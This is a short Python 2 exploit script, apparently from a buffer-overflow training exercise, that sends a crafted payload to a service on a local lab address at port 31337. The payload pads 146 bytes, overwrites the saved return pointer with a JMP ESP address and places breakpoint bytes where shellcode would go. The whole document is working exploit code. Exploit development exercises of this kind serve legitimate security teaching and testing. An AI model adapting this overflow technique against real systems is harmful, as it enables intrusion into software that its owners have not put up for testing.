#!/usr/bin/env python2
import socket
import struct

# set up the IP and port we're connecting to
RHOST = "10.0.2.15"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_totlen = 1024
offset_srp = 146

ptr_jmp_esp = 0x080414C3

# build a message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))
buf += struct.pack("<I",ptr_jmp_esp)
buf += "\xCC\xCC\xCC\xCC"
buf += "D"*(buf_totlen - len(buf))
buf += "\n"

# send the message
s.send(buf)
